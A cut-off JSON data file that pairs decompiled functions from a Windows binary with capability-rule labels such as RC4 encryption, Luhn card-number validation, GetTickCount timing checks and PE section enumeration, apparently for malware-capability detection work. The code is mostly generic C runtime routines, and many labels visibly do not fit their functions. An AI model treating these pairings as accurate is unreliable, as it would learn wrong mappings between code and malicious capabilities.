            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403c30(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    arg_8h = *(arg_8h + 0x3c) + arg_8h;\n    uVar3 = 0;\n    uVar2 = *(arg_8h + 0x14) + 0x18 + arg_8h;\n    if (*(arg_8h + 6) != 0) {\n        do {\n            if (*(uVar2 + 0xc) <= arg_ch) {\n                if (arg_ch < *(uVar2 + 8) + *(uVar2 + 0xc)) {\n                    return uVar2;\n                }\n                uVar1 = CONCAT21(uVar2 >> 0x10, uVar2);\n                uVar2 = CONCAT21((uVar1 << 8) >> 0x10, uVar2 >> 8) << 8 | uVar1 & 0xff;\n            }\n            uVar3 = uVar3 + 1;\n            uVar2 = uVar2 + 0x28;\n        } while (uVar3 < *(arg_8h + 6));\n    }\n    return 0;\n}\n",
        "token_count": 293
    },
    "0042e197": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall loc.0042e197(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    \n    do {\n        if (unaff_EDI < *(in_EAX + 8) + param_1) {\n            return;\n        }\n        uVar1 = CONCAT21(in_EAX >> 0x10, in_EAX);\n        uVar1 = CONCAT21((uVar1 << 8) >> 0x10, in_EAX >> 8) << 8 | uVar1 & 0xff;\n        do {\n            param_2 = param_2 + 1;\n            in_EAX = uVar1 + 0x28;\n            if (unaff_ESI <= param_2) {\n                return;\n            }\n            param_1 = *(uVar1 + 0x34);\n            uVar1 = in_EAX;\n        } while (unaff_EDI < param_1);\n    } while( true );\n}\n",
        "token_count": 241
    },
    "00404214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404214(uint32_t arg_8h)\n\n{\n    if ((arg_8h < 0x411dd0) || (0x412030 < arg_8h)) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg_8h + 0x20);\n    }\n    else {\n        fcn.004030f7((arg_8h - 0x411dd0 >> 5) + 0x10);\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) | 0x8000;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00404287": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404287(uint32_t arg_8h)\n\n{\n    if ((0x411dcf < arg_8h) && (arg_8h < 0x412031)) {\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) & 0xffff7fff;\n        fcn.0040301e((arg_8h - 0x411dd0 >> 5) + 0x10);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg_8h + 0x20);\n    return;\n}\n",
        "token_count": 138
    },
    "0042e17c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl loc.0042e17c(uint noname_0, uint arg_ch)\n\n{\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    \n    *unaff_ESI = *unaff_ESI + *(unaff_EBP + 0xc);\n    return;\n}\n",
        "token_count": 69
    },
    "00407103": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __thiscall fcn.00407103(uint32_t *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    do {\n        if ((param_1 & 3) == 0) goto code_r0x00407120;\n        cVar1 = *param_1;\n        param_1 = param_1 + 1;\n    } while (cVar1 != '\\0');\ncode_r0x00407153:\n    return param_1 + (-1 - param_2);\ncode_r0x00407120:\n    do {\n        do {\n            puVar3 = param_1;\n            param_1 = puVar3 + 1;\n        } while (((*puVar3 ^ 0xffffffff ^ *puVar3 + 0x7efefeff) & 0x81010100) == 0);\n        uVar2 = *puVar3;\n        if (uVar2 == '\\0') {\n            return puVar3 - param_2;\n        }\n        if (uVar2 >> 8 == '\\0') {\n            return puVar3 + (1 - param_2);\n        }\n        if ((uVar2 & 0xff0000) == 0) {\n            return puVar3 + (2 - param_2);\n        }\n    } while ((uVar2 & 0xff000000) != 0);\n    goto code_r0x00407153;\n}\n",
        "token_count": 329
    },
    "004070f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.004070f0(uint32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    \n    uVar2 = param_1 & 3;\n    puVar4 = param_1;\n    while (uVar2 != 0) {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n        if (cVar1 == '\\0') goto code_r0x00407153;\n        uVar2 = puVar4 & 3;\n    }\n    do {\n        do {\n            puVar3 = puVar4;\n            puVar4 = puVar3 + 1;\n        } while (((*puVar3 ^ 0xffffffff ^ *puVar3 + 0x7efefeff) & 0x81010100) == 0);\n        uVar2 = *puVar3;\n        if (uVar2 == '\\0') {\n            return puVar3 - param_1;\n        }\n        if (uVar2 >> 8 == '\\0') {\n            return puVar3 + (1 - param_1);\n        }\n        if ((uVar2 & 0xff0000) == 0) {\n            return puVar3 + (2 - param_1);\n        }\n    } while ((uVar2 & 0xff000000) != 0);\ncode_r0x00407153:\n    return puVar4 + (-1 - param_1);\n}\n",
        "token_count": 339
    },
    "0042e09b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __thiscall loc.0042e09b(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char in_AL;\n    uint32_t *puVar2;\n    \n    while (param_1 = param_1 + 1,  in_AL != '\\0') {\n        if ((param_1 & 3) == 0) goto code_r0x00407120;\n        in_AL = *param_1;\n    }\ncode_r0x00407153:\n    return param_1 + (-1 - param_2);\ncode_r0x00407120:\n    do {\n        do {\n            puVar2 = param_1;\n            param_1 = puVar2 + 1;\n        } while (((*puVar2 ^ 0xffffffff ^ *puVar2 + 0x7efefeff) & 0x81010100) == 0);\n        uVar1 = *puVar2;\n        if (uVar1 == '\\0') {\n            return puVar2 - param_2;\n        }\n        if (uVar1 >> 8 == '\\0') {\n            return puVar2 + (1 - param_2);\n        }\n        if ((uVar1 & 0xff0000) == 0) {\n            return puVar2 + (2 - param_2);\n        }\n    } while ((uVar1 & 0xff000000) != 0);\n    goto code_r0x00407153;\n}\n",
        "token_count": 326
    },
    "004071da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004071da(char *param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    char *arg_ch;\n    uint *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    \n    pcVar5 = *(param_4 + 0xc);\n    if ((param_1 == NULL) || (param_2 == 0)) {\n        puVar1 = fcn.00403a1e();\n        uVar6 = 0x16;\n        *puVar1 = 0x16;\n    }\n    else {\n        *param_1 = '\\0';\n        iVar3 = 0;\n        if (0 < param_3) {\n            iVar3 = param_3;\n        }\n        if (iVar3 + 1U < param_2) {\n            arg_ch = param_1 + 1;\n            *param_1 = '0';\n            pcVar2 = arg_ch;\n            if (0 < param_3) {\n                do {\n                    cVar4 = *pcVar5;\n                    if (cVar4 == '\\0') {\n                        cVar4 = '0';\n                    }\n                    else {\n                        pcVar5 = pcVar5 + 1;\n                    }\n                    *pcVar2 = cVar4;\n                    pcVar2 = pcVar2 + 1;\n                    param_3 = param_3 + -1;\n                } while (0 < param_3);\n            }\n            *pcVar2 = '\\0';\n            if ((-1 < param_3) && ('4' < *pcVar5)) {\n                while (pcVar2 = pcVar2 + -1,  *pcVar2 == '9') {\n                    *pcVar2 = '0';\n                }\n                *pcVar2 = *pcVar2 + '\\x01';\n            }\n            if (*param_1 == '1') {\n                *(param_4 + 4) = *(param_4 + 4) + 1;\n            }\n            else {\n                iVar3 = fcn.004070f0(arg_ch);\n                fcn.00406d80(param_1, arg_ch, iVar3 + 1);\n            }\n            return 0;\n        }\n        puVar1 = fcn.00403a1e();\n        uVar6 = 0x22;\n        *puVar1 = 0x22;\n    }\n    fcn.00403521();\n    return uVar6;\n}\n",
        "token_count": 558
    },
    "00407bee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407bee(void)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    \n    // WARNING: Could not recover jumptable at 0x00407c00. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 73
    },
    "0042e18b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid loc.0042e18b(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00407ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407ee0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg_8h;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return (piVar2 - arg_8h >> 1) + -1;\n}\n",
        "token_count": 104
    },
    "004083ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004083ac(int32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint lpWideCharStr, uint arg_18h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = arg_10h;\n    puVar1 = arg_ch;\n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\ncode_r0x004083d0:\n        uVar3 = 0;\n    }\n    else {\n        if (arg_8h != NULL) {\n            *arg_8h = -1;\n        }\n        if (0x7fffffff < arg_10h) {\n            puVar4 = fcn.00403a1e();\n            *puVar4 = 0x16;\n            fcn.00403521();\n            return 0x16;\n        }\n        fcn.004023de(arg_18h);\n        if (*(var_10h + 0x14) == 0) {\n            if (lpWideCharStr < 0x100) {\n                if (puVar1 != NULL) {\n                    if (uVar2 == 0) goto code_r0x0040845c;\n                    *puVar1 = lpWideCharStr;\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = 1;\n                }\ncode_r0x0040848b:\n                if (var_4h != '\\0') {\n                    *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                }\n                goto code_r0x004083d0;\n            }\n            if ((puVar1 != NULL) && (uVar2 != 0)) {\n                fcn.004074b0(puVar1, 0, uVar2);\n            }\n        }\n        else {\n            arg_ch = NULL;\n            iVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (*(var_10h + 4), 0, &lpWideCharStr, 1, puVar1, uVar2, 0, &arg_ch);\n            if (iVar5 == 0) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar5 == 0x7a) {\n                    if ((puVar1 != NULL) && (uVar2 != 0)) {\n                        fcn.004074b0(puVar1, 0, uVar2);\n                    }\ncode_r0x0040845c:\n                    puVar4 = fcn.00403a1e();\n                    *puVar4 = 0x22;\n                    fcn.00403521();\n                    if (var_4h == '\\0') {\n                        return 0x22;\n                    }\n                    *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                    return 0x22;\n                }\n            }\n            else if (arg_ch == NULL) {\n                if (arg_8h != NULL) {\n                    *arg_8h = iVar5;\n                }\n                goto code_r0x0040848b;\n            }\n        }\n        puVar4 = fcn.00403a1e();\n        *puVar4 = 0x2a;\n        puVar4 = fcn.00403a1e();\n        uVar3 = *puVar4;\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 895
    },
    "0040871c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040871c(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408672(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00408878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408878(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004087c8(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00408fbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408fbe(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0040bb60(arg_8h, arg_ch, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        iVar2 = fcn.00403a1e();\n        if (iVar2 != 0) {\n            piVar3 = fcn.00403a1e();\n            *piVar3 = var_4h;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 168
    },
    "00409051": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409051(uint arg_8h)\n\n{\n    fcn.00408ffe(0, arg_8h, 0, 4);\n    return;\n}\n",
        "token_count": 42
    },
    "0040bd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040bd00(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    uchar auStack4 [4];\n    \n    puVar1 = in_EAX + (&stack0x00000004 + -in_EAX & 0xf) | -CARRY4(in_EAX, &stack0x00000004 + -in_EAX & 0xf);\n    puVar3 = &stack0x00000000 - puVar1 & ~-(*0x10 < puVar1);\n    for (puVar2 = auStack4 & 0xfffff000; puVar3 < puVar2; puVar2 = puVar2 + -0x400) {\n    }\n    *puVar3 = unaff_retaddr;\n    return;\n}\n",
        "token_count": 193
    },
    "0042e0df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall loc.0042e0df(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    char cVar7;\n    uint32_t uVar8;\n    uint32_t unaff_EBX;\n    \n    do {\n        puVar6 = param_2 + 1;\n        if (*param_2 == unaff_EBX) {\n            return param_2;\n        }\n        if (*param_2 == '\\0') {\n            return NULL;\n        }\n        param_2 = puVar6;\n    } while ((puVar6 & 3) != 0);\n    uVar8 = unaff_EBX | in_EAX;\n    while( true ) {\n        while( true ) {\n            uVar1 = *puVar6;\n            uVar4 = uVar1 ^ (uVar8 << 0x10 | uVar8);\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = puVar6 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            puVar6 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *puVar6;\n        cVar7 = uVar8;\n        if (uVar1 == cVar7) {\n            return puVar6;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == cVar7) {\n            return puVar6 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == cVar7) {\n            return puVar6 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == cVar7) {\n            return puVar6 + 3;\n        }\n        puVar6 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 635
    },
    "0040cc49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cc49(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ca7e(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 57
    },
    "0040d300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d300(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *arg_ch,  uVar1 != 0; arg_ch = arg_ch + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n        uVar1 = *arg_8h;\n        if (uVar1 == 0) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while ((*(&uStack40 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0);\n    return iVar3;\n}\n",
        "token_count": 343
    },
    "0040d3e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0040d3e2(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t auStack40 [32];\n    \n    while( true ) {\n        uVar1 = *arg_ch;\n        in_EAX = in_EAX & 0xffffff00 | uVar1;\n        if (uVar1 == 0) break;\n        arg_ch = arg_ch + 1;\n        auStack40[in_EAX >> 3] = auStack40[in_EAX >> 3] | '\\x01' << (uVar1 & 7);\n    }\n    do {\n        puVar2 = arg_8h;\n        uVar1 = *puVar2;\n        in_EAX = in_EAX & 0xffffff00 | uVar1;\n        if (uVar1 == 0) {\n            return in_EAX;\n        }\n        arg_8h = puVar2 + 1;\n    } while ((auStack40[in_EAX >> 3] >> (uVar1 & 7) & 1) == 0);\n    return puVar2;\n}\n",
        "token_count": 274
    },
    "0040dbd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040dbd5(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar4;\n    uint *puVar2;\n    uint32_t uVar3;\n    bool bVar5;\n    \n    if (*0x41388c != 0) {\n        uVar3 = fcn.0040daf3(arg_8h, arg_ch, arg_10h, 0);\n        return uVar3;\n    }\n    if (((arg_8h == NULL) || (arg_ch == NULL)) || (0x7fffffff < arg_10h)) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x16;\n        fcn.00403521();\n        return 0x7fffffff;\n    }\n    if (arg_10h != 0) {\n        do {\n            uVar4 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar4 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                uVar4 = uVar4 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar5 = uVar4 < uVar1;\n            if (uVar4 != uVar1) goto code_r0x0040dd01;\n            arg_10h = arg_10h - 1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar5 = uVar4 < uVar1;\n        if (uVar4 != uVar1) {\ncode_r0x0040dd01:\n            arg_10h = 0xffffffff;\n            if (!bVar5) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 503
    },
    "0040dcb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dcb0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x0040dd01;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x0040dd01:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 365
    },
    "0040dc28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040dc28(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_1 != 0) {\n        iVar1 = fcn.004070f0(param_1);\n        iVar2 = fcn.0040bacc(iVar1 + 1);\n        if (iVar2 != 0) {\n            iVar1 = fcn.0040717b(iVar2, iVar1 + 1, param_1);\n            if (iVar1 == 0) {\n                return iVar2;\n            }\n            fcn.004034cf(0, 0, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 162
    },
    "00406020": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00406020(char *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    iVar2 = -1;\n    do {\n        pcVar4 = arg_8h;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar4 = arg_8h + 1;\n        cVar1 = *arg_8h;\n        arg_8h = pcVar4;\n    } while (cVar1 != '\\0');\n    iVar2 = -(iVar2 + 1);\n    pcVar4 = pcVar4 + -1;\n    do {\n        pcVar3 = pcVar4;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar3 = pcVar4 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar3;\n    } while (arg_ch != cVar1);\n    pcVar3 = pcVar3 + 1;\n    if (*pcVar3 != arg_ch) {\n        pcVar3 = NULL;\n    }\n    return pcVar3;\n}\n",
        "token_count": 274
    },
    "00407a81": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a81(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040505f(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040c961": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c961(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    *0x413408 = *0x413408 + 1;\n    iVar1 = fcn.004075b7(0x1000);\n    arg_8h[2] = iVar1;\n    if (iVar1 == 0) {\n        arg_8h[3] = arg_8h[3] | 4;\n        arg_8h[2] = arg_8h + 5;\n        arg_8h[6] = 2;\n    }\n    else {\n        arg_8h[3] = arg_8h[3] | 8;\n        arg_8h[6] = 0x1000;\n    }\n    arg_8h[1] = 0;\n    *arg_8h = arg_8h[2];\n    return;\n}\n",
        "token_count": 203
    },
    "0040dc7a": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040dc7a(void)\n\n{\n    *0x412bc0 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "0040df24": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040df24(void)\n\n{\n    *0x412bd4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONIN$\", 0xc0000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402f7d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00402f7d(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = 0x412c58;\n    do {\n        if (*(iVar3 * 8 + 0x411b3c) == 1) {\n            piVar1 = iVar3 * 8 + 0x411b38;\n            *piVar1 = iVar4;\n            iVar4 = iVar4 + 0x18;\n            iVar2 = (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(*piVar1, 4000);\n            if (iVar2 == 0) {\n                *(iVar3 * 8 + 0x411b38) = 0;\n                return 0;\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x24);\n    return 1;\n}\n",
        "token_count": 219
    },
    "004058d7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint8_t * fcn.004058d7(void)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    \n    bVar2 = false;\n    if (*0x4149dc == 0) {\n        fcn.00406713();\n    }\n    puVar4 = *0x4149c8;\n    if (*0x4149c8 == NULL) {\n        puVar4 = 0x40ee90;\n    }\n    do {\n        uVar1 = *puVar4;\n        if (uVar1 < 0x21) {\n            if (uVar1 == 0) {\n                return puVar4;\n            }\n            if (!bVar2) {\n                for (; (*puVar4 != 0 && (*puVar4 < 0x21)); puVar4 = puVar4 + 1) {\n                }\n                return puVar4;\n            }\n        }\n        if (uVar1 == 0x22) {\n            bVar2 = !bVar2;\n        }\n        iVar3 = fcn.00409051(uVar1);\n        if (iVar3 != 0) {\n            puVar4 = puVar4 + 1;\n        }\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 296
    },
    "0040717b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040717b(uchar *param_1, int32_t param_2, char *param_3)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uStack16;\n    \n    if ((param_1 != NULL) && (param_2 != 0)) {\n        if (param_3 != NULL) {\n            iVar3 = param_1 - param_3;\n            do {\n                cVar1 = *param_3;\n                param_3[iVar3] = cVar1;\n                param_3 = param_3 + 1;\n                if (cVar1 == '\\0') break;\n                param_2 = param_2 + -1;\n            } while (param_2 != 0);\n            if (param_2 != 0) {\n                return 0;\n            }\n            *param_1 = 0;\n            puVar2 = fcn.00403a1e();\n            uStack16 = 0x22;\n            *puVar2 = 0x22;\n            goto code_r0x0040719a;\n        }\n        *param_1 = 0;\n    }\n    puVar2 = fcn.00403a1e();\n    uStack16 = 0x16;\n    *puVar2 = 0x16;\ncode_r0x0040719a:\n    fcn.00403521();\n    return uStack16;\n}\n",
        "token_count": 315
    },
    "00407efb": {
        "rules": [
            "contain loop"
        ],
